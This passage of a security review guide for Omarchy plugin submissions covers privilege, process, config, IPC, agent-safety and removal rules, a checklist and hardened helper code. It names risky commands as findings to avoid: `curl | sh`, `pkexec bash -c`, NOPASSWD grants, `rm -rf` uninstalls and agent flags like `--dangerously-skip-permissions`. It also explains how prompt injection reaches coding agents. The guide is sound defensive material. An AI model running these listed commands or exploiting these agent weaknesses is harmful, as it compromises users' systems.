- **Bundled binaries** (~100 comments): a committed ELF, `.pyc`, `.qsb` shader or AOT bundle "cannot be inspected". Ship source and build in a documented, consented setup step, or provide CI that rebuilds the exact artifact byte-for-byte in a digest-pinned container from the pinned commit and attaches a signed attestation. A sidecar `.sha256` is not provenance. Pin CI actions to full SHAs, images to digests, and set `permissions: contents: read`.
- **Side effects of loading**: `Component.onCompleted` building a venv, `install.sh --ensure` on load, symlinking skills into `~/.claude` or `~/.codex`, appending `source` blocks to `~/.bashrc` on a status poll. Ordinary activation is read-only. Downloads, builds, package installs, persistent writes and service mutations happen behind a clearly labelled button or a documented terminal command, with prior state preserved.
- `--noconfirm` on AUR installs skips the only review step; `pacman -Rdd` breaks other packages.
- Vendored code: record the upstream commit, keep licence notices, and disclose every modification. A translated fork that drops an upstream guard is a finding.

## 8. Privilege and system integration

- **Never elevate code from the checkout** (~120 comments): `sudo ./install.sh`, `pkexec <plugin-dir>/helper`, sudoers naming `~/.config/omarchy/plugins/...`, a symlink from `/usr/bin` into the checkout, `pkexec bash -c "$script"` with text from a user-writable file. The authorization dialog is a long window in which any same-user process swaps the file, and a warm sudo timestamp needs no prompt at all. Root executes only bytes it owns: `sudo install -o root -g root -m 0755` into `/usr/local/libexec/<plugin>/` once, in a visible terminal, with a matching polkit policy or a `visudo -cf`-validated sudoers rule limited to fixed verbs and literal arguments, data over stdin, and root-side validation of every input. Better: remove the privilege boundary (install to `~/.local/bin`, use `systemctl --user`).
- **Over-broad grants**: `NOPASSWD` for whole tools (`wg-quick`, `tlp`, `systemctl`, `kill`), polkit `allow_active=yes` or `Identity=*`, rules that match when `command_line` merely contains a path (any code inside the shared shell process satisfies the same check), udev `MODE=0666`, `chmod a+w` on sysfs, group-writable `/etc` config consumed by root, permanent `input` or `docker` group membership (keylogging and root-equivalent respectively), `setcap` on a PATH-resolved binary. Use `auth_admin`, `TAG+="uaccess"` or a dedicated group with 0660, and least privilege that removal revokes.
- **Root following user paths**: privileged `cp -f`, `chown`, `install` or `rm` on a path the user controls; PIDs, archives, package names or hashes read from user-writable state. Privileged code touches only fixed root-owned non-symlink paths verified immediately before use, and never trusts a user PID file.
- Transactional root changes: journal before mutating, back up what you replace, roll back on failure, track created versus inherited, never delete an administrator's pre-existing configuration, never remove `/var/lib/pacman/db.lck`.
- Show privileged commands in a visible terminal (`omarchy-launch-floating-terminal-with-presentation`) rather than a hidden `pkexec`.

## 9. Processes, PIDs, signals and daemons

- **No deadline, no process-group teardown** (~530 comments, mostly hardening since September but still requested): `Process.running = false` and `Process.signal()` reach only the wrapper, so `bash -c`, `hyprctl | head`, `ssh` and `pkexec` descendants survive; `timeout` without `-k`; `communicate(timeout=)` returning without reaping; restart loops with no budget; nothing in `Component.onDestruction`. Run each helper in its own session (`setsid`, `start_new_session=True`, or `systemd-run --user --scope`) under one supervisor that enforces an absolute deadline, byte ceilings while running, and TERM, short grace, KILL, reap for the whole group on deadline, overflow, supersession, cancel and destruction. Keep the escalation timer alive after the leader exits. Never treat `rc=None` or a failed observation as "exited".
- **PID reuse** (~110 comments): a stored PID, a PID file, `pkill -f substring`, `killall`, or a `/proc/<pid>/comm` check followed by a separate `kill`. Keep the owned `Process` handle; otherwise capture `(pid, start time, uid)` from `/proc/<pid>/stat` while the process is known live and re-read it immediately before every signal, or use `pidfd_open`/`pidfd_send_signal`; fail closed when identity cannot be read. A root helper never signals a PID a user file named.
- Stale requests: capture a generation per request and discard mismatched completions; serialize mutations; single-flight polls.
- Anything started detached needs a stop path that still works after the plugin directory is deleted, or it survives `omarchy plugin remove`.

## 10. Hyprland, Omarchy and shared user configuration

- **Rewriting shared config unsafely or without consent** (~140 comments): appending to `bindings.lua` on load, `sed -i` on `hyprland.lua`, rewriting `shell.json` through a temp in `/tmp`, an `awk` block edit that truncates from the start marker to EOF when the end marker is missing, restore functions that swallow failures and still report "rolled back", `hyprctl keyword` in `Component.onCompleted`. The submission checklist says the plugin does not overwrite user configuration without explicit consent, and reviewers hold you to it. Prefer a plugin-owned state file, or `host.mutateShellConfig()`/`updateEntryInline` for `shell.json`. If a shared file must be edited: an explicit user action, one uniquely marked contiguous block with no interpolated values, exact structural validation that fails closed on malformed or duplicate markers, a backup, a same-directory exclusive temporary with atomic replacement, `hyprctl reload` plus `hyprctl configerrors` with rollback to the exact prior bytes and mode, and removal of only that block on uninstall.
- Do not modify, overwrite or delete other components' files (Nautilus extensions, other plugins' state, WirePlumber config, global shortcuts) without ownership proof and a separate explicit action. Namespace anything you drop into `*.conf.d` directories.
- A global compositor binding cannot be proven owned by a file marker; prefer a plugin-owned layer-shell click catcher or a submap.
- Generated Lua that reads a replaceable JSON with `io.open` inside Hyprland, or `dofile` on a state file, executes state as code; store passive bounded data and parse it with a closed schema.

## 11. Local IPC, sockets, ports and D-Bus

- **Unauthenticated local control** (~80 comments): a 0666 socket in `/tmp`, an abstract socket with no `SO_PEERCRED`, a loopback HTTP server that accepts state-changing POSTs without a token or `Origin`/`Host` check (any web page can send it simple requests), `/api/bootstrap` returning the write token, a fixed DevTools port, a D-Bus service that ignores the sender, a service bound to `0.0.0.0`. "Loopback binding is not authentication." Sockets go in a verified 0700 runtime directory at mode 0600 with a `SO_PEERCRED` UID check and a client cap; HTTP gets a random port, a per-session `randomBytes(24)` token compared in constant time, `Host`/`Origin` checks, JSON-only content types, a frame size and per-connection deadline before parsing.
- **Public `IpcHandler` methods** (~25 comments): anything reachable via `omarchy-shell shell ...` that changes state, starts a capture or an agent, deletes, or returns sensitive data without user presence is a finding. Keep IPC to parameterless `open`/`close`/`toggle`, coerce the few parameters with `Number()`, and apply the same bounds inside the handler as at the UI. A parameterised method that only triggers the plugin's own normal, non-destructive behaviour (a test hook that opens a panel) is hardening; one that persists, captures, deletes, spends money or reaches a command or path sink is a blocker.
- Line-framed sockets and native-messaging hosts need a byte ceiling before the newline buffering, a connection cap, and a deadline.

## 12. Privacy, disclosure and README claims

- **Claims that do not match the code** (~85 comments): "no network" while `AutoText` or a Markdown renderer fetches resources; "Open-Meteo only" while `wttr.in` is called; "keyring only" while passwords sit in `shares.json`; "0600" with no mode set; "never edits `~/.config/hypr`" while it does; "transcripts stay local" while audio goes to `api.openai.com`. The discrepancy is itself a blocker. Keep README, manifest, submission checklist and code consistent at the reviewed commit; describe every external endpoint, every credential and which domain receives it, every file written and what survives removal.
- **Sensitive capture needs informed opt-in**: opening every `/dev/input/event*`, logging preedit text, IP geolocation on the default path, scanning browser LevelDB stores on enable, reading the clipboard on a cancelled picker, capturing window titles or argv. Default off, narrow scope, explicit consent before the first request.
- Cache contents count as private data (section 2).

## 13. AI agents and prompt injection

- **Agent instruction files in the installable tree** (~40 comments): `AGENTS.md`, `CLAUDE.md`, `.claude/`, `.codex/`, `.agents/`, `.gemini/`, `SKILL.md`, `.herdr/`. `omarchy plugin add` copies the repository verbatim into a path coding agents auto-discover, which makes it a prompt-injection surface regardless of content. Remove them from the distributed tree (a `docs/CONTRIBUTING.md` that agents do not auto-load is fine). Installers that symlink skills into `~/.claude/skills` or append to `~/.claude/CLAUDE.md` need a separate, disclosed opt-in.
- **Untrusted text into a tool-capable agent** (~45 comments): transcripts, captions, OCR, clipboard, container labels or remote content sent to `claude -p`, `codex exec`, `opencode run`, Copilot or Crush. `-p` is not tool-free; omitting `--allowedTools` is not a deny boundary; `--sandbox read-only` still reads the home directory; a prompt sentence and a Bash pattern allowlist are not authorization boundaries. Only invocations that are provably tool-free in code (`--tools ""`), fail closed for agents that cannot be, never `--dangerously-skip-permissions`, `--yolo`, `--auto-approve` or `--allow-all-tools`, off by default, and an on-screen confirmation showing the exact argv per action. Render model output as PlainText.
- Untrusted values placed into a prompt: strip control characters, cap length, put the value in an explicitly delimited block labelled as untrusted data.

## 14. Removal, uninstall and residual state

- **README removal section** (~80 comments): required by the submission contract. Name the exact `omarchy plugin remove <id>` command with the current ID, list every artifact that persists (state, cache, credentials, keyring entries, units, hooks, packages, symlinks, firewall rules, sudoers, udev), say which are deleted and which are kept, with the real paths. If you cache mail subjects, camera frames or locations, say they survive removal. Never document `rm -rf` as the removal method.
- **Removal that leaves things running or granted** (~70 comments): detached daemons, an MPV child, a signed-in Chromium, user timers, `NOPASSWD` rules, polkit actions, hooks in `theme-set.d`, menu rows, generated Hyprland blocks, a disabled touchpad never re-enabled. A cleanup path must stay executable after the plugin directory is gone, stop owned descendants, revoke grants, restore prior state.
- **Uninstallers that delete too much** (~70 comments): `rm -rf` on an env-derived directory, globbing `themes/omarchy-*`, removing every WireGuard connection, package-removing whatever owns a PATH binary, treating any file containing the plugin name as owned. Remove only literal named paths whose identity (marker, content hash or recorded symlink target) proves this plugin wrote them; refuse unmanaged trees; never `rm -rf` or glob; install and uninstall symmetric.

## 15. Repository hygiene

- No real device identifiers in the README or screenshots: serial numbers, certificate fingerprints, MAC addresses, account IDs. Use plausible placeholders; reviewers read READMEs as a privacy question.
- Leaked tokens and dev artifacts (`.gstack/`, `.wrangler/`, `__pycache__`, capture corpora, a 43 MiB GIF) get the tree blocked; revoke and rotate, remove, add ignore rules.
- Hard-coded home paths (`/home/you/...`) break every other user and reviewers catch them; resolve helpers from `manifest.__sourceDir` or the plugin directory.
- Manifest ID, `moduleName`, `ipcTarget`, README commands and install paths must agree; never reuse a built-in namespace like `omarchy.clock` (it collides with the stock widget's settings and IPC); a reserved or retired ID cannot be reused; `schemaVersion`, not `schemaversion`; no clone-only `omarchy.clonedFrom` unless it names the upstream SHA.
- Licence file present; bundled fonts, icons, sounds and datasets need verifiable redistribution rights and upstream notices; vendored code keeps its notice.
- Scanner limits: 512 KiB per text file, 8 MiB total, 1,000 files, and a literal NUL byte in a source file stops the baseline. Any file whose name contains `install`, `setup` or `uninstall` is read as text, so `setup.png` fails the scan; the preview must be `preview.png` at the root (`preview.jpg`, `preview.jpeg`, `preview.webp` and `preview.avif` are also accepted by validation; any other name is simply not a preview).
- Keep tests green; reviewers run them and notice when failing suites are deleted instead of fixed.

## The automated baseline

The bot runs `security-baseline-scanner.mjs` against the exact commit. It is deterministic and narrow. Findings that block (`security-needs-fixes`): `curl-pipe-shell`, `remote-git-execution-unpinned`, `cargo-git-unpinned`, `sudoers-dangerous-passwordless-command`, `privileged-process-control-from-shared-temp`. Capabilities that only require manual review (`security-review-required`): `installer`, `package-manager`, `privilege` (any non-negated `sudo`/`pkexec`), `remote-build`, `service-management`, `bundled-executable-binary`, `sudoers-modification`. A README sentence saying "no sudo is required" is a string match the maintainer classifies away; you need not remove it, but expect the label.

Run it locally before every submission; it takes a minute and saves a day:

```bash
mp=$(mktemp -d) && git clone --depth 1 https://github.com/omacom/omarchy-plugin-marketplace "$mp" && cd "$mp" && npm ci --silent
GITHUB_TOKEN=$(gh auth token) SHA=$(git -C /path/to/plugin rev-parse HEAD) \
node --input-type=module -e '
import { runSecurityBaseline } from "./scripts/security-baseline-scanner.mjs";
const r = await runSecurityBaseline("https://github.com/<owner>/<repo>", process.env.SHA,
  { token: process.env.GITHUB_TOKEN, requiredPaths: ["Panel.qml"] });
console.log(r.outcome, JSON.stringify(r.findings, null, 2), JSON.stringify(r.capabilities));'
```

`passed` with no findings and no capabilities becomes `Verified` automatically after maintainer approval. Everything else waits for the manual review this skill is about.

## Submission mechanics that cost people days

- **Exact-SHA binding** (~210 comments): validation, the encoded baseline, current default-branch HEAD and the manually reviewed tree must all be the same 40-character commit. Any push after validation, even README or `preview.png` only, makes the review stale and no label is applied. Put all fixes on one final commit, then trigger validation, then leave HEAD alone until approval. Abbreviated SHAs are rejected.
- **Re-validation is triggered by editing the issue body**, not by commenting. The workflow listens to `issues: [opened, edited, reopened, labeled]`; something in the body must actually change. Replying with the fix SHA is courtesy.
- **Submission form**: title starts with `[Plugin]:`; all six headings from `SUBMISSION.md` in order; all five checklist boxes with the exact wording; `### Repository URL` contains only the bare repository root, no trailing slash; one category spelled exactly; at most three tags; `preview.png` at the root; a licence file. Comments do not update metadata.
- **Labels**: `needs-fixes` and `security-needs-fixes` block; `security-review-required` and `manual-setup` are classifications, not blockers, and stay on the listing. `manual-setup` applies whenever `omarchy plugin add ... --enable` alone does not yield a working plugin (external CLIs, accounts, API keys, daemons, native builds, group membership, binding edits). Something Omarchy already ships does not count.
- **Seven-day rule**: a submission with an open blocker and no response for seven days is closed; open a new one when fixed.
- **Updates**: a listed plugin's newer commit is published through the `[Verify]` form with the full SHA; the ID must match the listing; changing form headings breaks the parser; the SHA in a comment does not retarget the request.
- **Duplicates, moves, forks**: one issue per repository; a renamed or transferred repository needs a new submission; a fork or `clonedFrom` inherits every upstream finding and should record the upstream SHA.
- **Wording that works in your reply**: the exact commit, each finding listed as closed (not moved) with file and line, tests added for the race that was reported. Reviewers verify "the flow that actually runs", diff the claimed fix commit, grep-count `textFormat`, measure Quickshell behaviour, and treat an inaccurate claim as a new finding.
- One finding on one of your plugins applies to all of them; reviewers compare an author's other submissions. Fix the class across your repositories before the re-check, and put a link to the reporter's comment in the commit message so the re-check can see what was addressed.

## Pre-submission checklist

Files and state
- [ ] Every read of a file the plugin did not just create goes through a single `O_NOFOLLOW|O_NONBLOCK` descriptor, `fstat`-validated, read `cap + 1`
- [ ] Every write is an exclusive random temporary in the destination directory, 0600 from creation, `fsync`, `rename`, directory `fsync`
- [ ] Parent directories are walked with held descriptors; no `mkdir -p` on a chain you then trust; the permission repair runs unconditionally and removes non-regular entries
- [ ] No fixed `/tmp` paths, no `${XDG_RUNTIME_DIR:-/tmp}`; fail closed instead
- [ ] `FileView` is watcher-only (`preload: false`, `blockAllReads: true`)
- [ ] Traversal, deletion and archive extraction are bounded to an opened root and reject `..`, symlinks and special files

Secrets
- [ ] No token, password, OTP or private content in any argv or environment; stdin or `-H @-` instead; never interpolate a token into `curl --config`; `curl -q` first; tracing off
- [ ] Credential files 0600 in 0700 directories from creation; keyring preferred; no silent plaintext fallback
- [ ] Nothing secret in logs, errors, notifications or long-lived QML properties

Bounds
- [ ] Every child process is byte-capped at the producer (`head -c cap+1`), has an absolute deadline, runs in its own group and is TERM/KILL/reaped
- [ ] Every remote response is capped while streaming (`--max-filesize` plus `head -c`, `read(MAX+1)`)
- [ ] After the byte cap: item counts, string lengths, depth, finite numbers, null-prototype maps
- [ ] No `StdioCollector`; no default `SplitParser` on untrusted output

QML
- [ ] `textFormat: Text.PlainText` on every `Text`, `Label`, `TextEdit` (audit script says none missing)
- [ ] Strings into `tooltipText`, `ConfirmDialog`, `PanelSectionHeader`, `WidgetButton` are stripped of `<`, `>`, `&`, controls and capped
- [ ] No remote or player-supplied URL reaches `Image.source`; local copies with `sourceSize`

Commands and network
- [ ] All processes are argv arrays; any `sh -c` is a constant script taking `$1`; nothing external inside `hyprctl eval` strings without a closed grammar
- [ ] No external value in `$(( ))`, `[ x -gt y ]`, `let` or `declare -i`
- [ ] `--` before every data argument; option-shaped values rejected; URLs parsed and host-allowlisted before `xdg-open`
- [ ] Absolute executable paths and `clearEnvironment: true` wherever a secret or privilege is involved
- [ ] HTTPS only, redirects refused on credentialed requests, non-global addresses rejected and pinned, fixed API origins

Supply chain, privilege, processes
- [ ] No `curl | sh`, no branch or tag clones, no `releases/latest`, no unpinned package installs, no self-update; full SHA plus detached checkout or hash-locked installs
- [ ] No committed executables; or reproducible-build attestation
- [ ] Nothing elevated from the checkout; root-owned fixed helper with a narrow rule, or no privilege at all
- [ ] Signals only to an owned handle or a `(pid, start time, uid)` re-read immediately before sending
- [ ] Loading the plugin mutates nothing; every install, download or config edit is behind an explicit action

Config, IPC, agents, removal, repo
- [ ] Shared Hyprland or `shell.json` edits: explicit action, one marked block, backup, validate, reload, rollback, removed on uninstall
- [ ] Sockets in a verified 0700 runtime directory with `SO_PEERCRED`; HTTP with a per-session token and `Origin`/`Host` checks; IPC methods parameterless
- [ ] No `AGENTS.md`, `CLAUDE.md`, `.claude`, `.codex`, `.agents` in the tree; no tool-enabled agent invocation on untrusted text
- [ ] README: every endpoint, every file written, a Removing section with the real `omarchy plugin remove <id>` and what survives; claims match code
- [ ] Removal stops daemons, revokes grants, restores state, deletes only proven-owned paths
- [ ] No real serial numbers, fingerprints or account IDs in the README; no leaked tokens or dev artifacts, no hard-coded home paths, no file over 512 KiB, no NUL bytes, preview named `preview.png`, licence present, IDs consistent
- [ ] Local baseline run says `passed`; all fixes on one commit; issue body edited to trigger validation

## Appendix: helpers reviewers have accepted

### Descriptor-bound state file helper (Python)

Invoke as an argv array from QML (`["/usr/bin/python3", "-I", "-S", helperPath, "read", name]`) and keep `FileView` as a watcher. This is the shape that has been approved dozens of times; adapt the limits and the schema.

```python
#!/usr/bin/python3 -I
import os, pwd, re, stat, sys, json, secrets

MAX_BYTES = 65536
_COMPONENT = re.compile(r"[A-Za-z0-9._-]+")

def _ok_component(name):
    return bool(_COMPONENT.fullmatch(name)) and name not in (".", "..")

def open_dir_chain(parts):
    """Walk from the passwd home with held descriptors; return the final dirfd."""
    if not parts or not all(_ok_component(p) for p in parts):
        raise PermissionError("refusing directory chain")
    # $HOME is attacker-controlled for a same-UID child; passwd is the trust anchor.
    # The home itself may be a symlink (user config), so do not O_NOFOLLOW the anchor.
    home = pwd.getpwuid(os.geteuid()).pw_dir
    fd = os.open(home, os.O_RDONLY | os.O_DIRECTORY | os.O_CLOEXEC)
    try:
        for i, name in enumerate(parts):
            try:
                nfd = os.open(name, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW | os.O_CLOEXEC, dir_fd=fd)
            except FileNotFoundError:
                try:
                    os.mkdir(name, 0o700, dir_fd=fd)
                except FileExistsError:
                    pass
                nfd = os.open(name, os.O_RDONLY | os.O_DIRECTORY | os.O_NOFOLLOW | os.O_CLOEXEC, dir_fd=fd)
            os.close(fd)
            fd = nfd
            st = os.fstat(fd)
            if not stat.S_ISDIR(st.st_mode) or st.st_uid != os.geteuid():
                raise PermissionError(f"untrusted directory component {name}")
            # Only the plugin's own leaf directory is forced to 0700; XDG parents stay as set.
            if i == len(parts) - 1 and st.st_mode & 0o077:
                os.fchmod(fd, 0o700)
        return fd
    except BaseException:
        os.close(fd)
        raise

def read_bounded(dirfd, name):
    try:
        fd = os.open(name, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK | os.O_CLOEXEC, dir_fd=dirfd)
    except FileNotFoundError:
        return None
    try:
        st = os.fstat(fd)
        if (not stat.S_ISREG(st.st_mode) or st.st_uid != os.geteuid() or st.st_nlink != 1
                or st.st_mode & 0o077 or st.st_size > MAX_BYTES):
            raise PermissionError("refusing state file (expected 0600, owner-only, one link)")
        os.set_blocking(fd, True)
        data = b""
        while len(data) <= MAX_BYTES:
            chunk = os.read(fd, min(65536, MAX_BYTES + 1 - len(data)))
            if not chunk:
                break
            data += chunk
        if len(data) > MAX_BYTES:
            raise PermissionError("state file grew past the limit")
        return data
    finally:
        os.close(fd)

def write_atomic(dirfd, name, data: bytes):
    if len(data) > MAX_BYTES:
        raise ValueError("payload too large")
    tmp = f".{name}.{secrets.token_hex(8)}.tmp"
    fd = os.open(tmp, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_NOFOLLOW | os.O_CLOEXEC, 0o600, dir_fd=dirfd)
    try:
        os.fchmod(fd, 0o600)
        view = memoryview(data)
        while view:
            n = os.write(fd, view)
            view = view[n:]
        os.fsync(fd)
        os.rename(tmp, name, src_dir_fd=dirfd, dst_dir_fd=dirfd)
        os.fsync(dirfd)
    except BaseException:
        try:
            os.unlink(tmp, dir_fd=dirfd)
        except OSError:
            pass
        raise
    finally:
        os.close(fd)

if __name__ == "__main__":
    op, name = sys.argv[1], sys.argv[2]
    if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]{0,63}", name) or name in (".", ".."):
        sys.exit(2)
    dirfd = open_dir_chain([".local", "state", "my-plugin"])
    try:
        if op == "read":
            raw = read_bounded(dirfd, name)
            sys.stdout.write(raw.decode("utf-8", "strict") if raw else "")
        elif op == "write":
            payload = sys.stdin.buffer.read(MAX_BYTES + 1)
            if len(payload) > MAX_BYTES:
                sys.exit(3)
            json.loads(payload)          # then apply the same count/length/depth caps as a remote body
            write_atomic(dirfd, name, payload)
        else:
            sys.exit(2)
    finally:
        os.close(dirfd)
```

### Bounded, supervised command (bash)

```bash
#!/usr/bin/bash
set -uo pipefail
MAX=262144
ERR_MAX=4096
LC_ALL=C
# Own session, absolute deadline with KILL escalation, producer-side cap of MAX + 1.
# Do not take MAX from the environment. ${#out} counts bytes only under LC_ALL=C.
# `--` so a command that starts with - is not an option to timeout.
out=$(/usr/bin/setsid -w /usr/bin/timeout -k 2 -- 20 "$@" 2> >(/usr/bin/head -c $((ERR_MAX + 1)) >&2) | /usr/bin/head -c $((MAX + 1)))
rc=$?
if [ ${#out} -gt "$MAX" ]; then echo "output exceeded ${MAX} bytes" >&2; exit 1; fi
[ "$rc" -eq 0 ] || exit "$rc"
printf '%s' "$out"
```

With `pipefail`, `rc` is the first non-zero status in the pipeline, so a failing producer is not masked by a happy `head`; a producer killed by `SIGPIPE` after emitting more than `MAX` bytes is caught by the length check first. Stderr is truncated at `ERR_MAX + 1` here; detecting overflow on that stream needs a second held descriptor or a Python supervisor. Bash `$(...)` also cannot hold NUL bytes.

### Bounded, pinned fetch (bash)

```bash
fetch_json() {
  local url=$1 max=${2:-1048576}
  [[ $max =~ ^[1-9][0-9]{0,8}$ ]] || return 1
  case $token in *[$'\r\n']*) return 1 ;; esac
  [[ $url =~ ^https://api\.example\.com/ ]] || return 1
  printf 'Authorization: Bearer %s\n' "$token" \
    | /usr/bin/curl -q -sS --fail -H @- --proto '=https' --proto-redir '=https' \
        --max-time 10 --connect-timeout 5 --max-filesize "$max" --noproxy '*' -- "$url" \
    | /usr/bin/head -c $((max + 1))
}
# call under set -o pipefail, and treat a result longer than $max as failure
```

No `-L`, so a redirect is a failure rather than a token leak. Add `--resolve host:443:IP` after validating the address when the host is configurable. A PATH `curl` or `head` on this pipeline receives the response body (and can see the request); both binaries are pinned. Do not build a `--config` file with `printf … "$token"`: a quote or newline in the token is another curl directive.

### Process with bounded output in QML

```qml
Process {
  id: proc
  command: ["/usr/bin/bash", pluginDir + "/bin/bounded-cmd", "/usr/bin/hyprctl", "-j", "clients"]
  stdout: SplitParser {
    splitMarker: ""
    onRead: function(chunk) {
      root.buf += chunk
      // .length counts UTF-16 units, so this is defense in depth; the byte cap is in the helper
      if (root.buf.length > root.maxBytes) { proc.signal(15); killTimer.start(); root.buf = "" }
    }
  }
  onExited: function(code, status) { if (code === 0) root.apply(root.buf); root.buf = "" }
}
Timer { id: killTimer; interval: 2000; onTriggered: proc.signal(9) }
Component.onDestruction: { proc.signal(15) }
```

### Signal by identity, not by number (Python)

```python
def identity(pid):
    with open(f"/proc/{pid}/stat", "rb") as f:
        fields = f.read().rsplit(b")", 1)[1].split()
    return (pid, fields[19], os.stat(f"/proc/{pid}").st_uid)   # starttime, uid

def stop(pid, expected):
    fd = os.pidfd_open(pid)          # pin the process first; PIDs reuse
    try:
        if identity(pid) != expected:
            return False             # reused between capture and open; refuse
        signal.pidfd_send_signal(fd, signal.SIGTERM)
        return True
    finally:
        os.close(fd)
```

### The reviewer's one-line rules, for reference

"A cap applied after collection is applied too late." "`--max-time` bounds time, not bytes." "`O_NOFOLLOW` protects only the final component." "`rename(2)` replaces a symlink at the destination rather than writing through it." "Loopback binding is not authentication." "App name/hints are not an authorization boundary." "A prompt-level instruction and a Bash command-pattern allowlist are not an authorization boundary." "Checksums only bind bytes to themselves." "Documenting that behavior does not remove the credential leak." "A security check should fail closed, not delete an object it did not create." "The threat model here is not a malicious plugin; it is an ordinary user connecting to airport Wi-Fi."
